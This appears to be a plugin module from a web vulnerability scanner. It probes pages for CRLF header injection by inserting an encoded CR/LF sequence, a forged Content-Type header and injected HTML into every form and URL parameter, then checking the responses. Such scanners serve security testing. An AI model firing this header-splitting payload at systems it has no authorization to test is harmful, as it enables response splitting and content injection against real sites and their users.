from ..utils import attack, change_parameter, modify_parameter

INJECTED_BODY = "<html><h1>Attacked!</h1></html>"
CLRF_SEQUENCE = "%0d%0aContent-Type: text/html%0d%0a%0d%0a"
ATTACK_SEQUENCE = CLRF_SEQUENCE + INJECTED_BODY


def attack_form(client, log, form):
    parameters = dict(form.get_parameters())
    for parameter in parameters:
        attack_parameters = modify_parameter(parameters, parameter,
                                             ATTACK_SEQUENCE)
        result = form.send(client, attack_parameters)
        evaluate(log, form.action, result)


def attack_url(client, log, url, parameter):
    attack_parameters = change_parameter(url, parameter, ATTACK_SEQUENCE)
    result = client.download_page(attack_parameters)
    evaluate(log, url, result)


def evaluate(log, target, result):
    if result.html == INJECTED_BODY:
        log('vuln', target, "CLRF Injection", "under " + target)
    elif result.status_code == 500:
        log('warn', target, "Parameter Parsing Error", "under " + target)


def search(page):
    for form in page.get_forms():
        yield ('form', form)

    for parameter, _ in page.get_url_parameters:
        yield ('url', page.url, parameter)


@attack(search)
def clrf(client, log, target_type, *args):
    globals()['attack_' + target_type](client, log, *args)
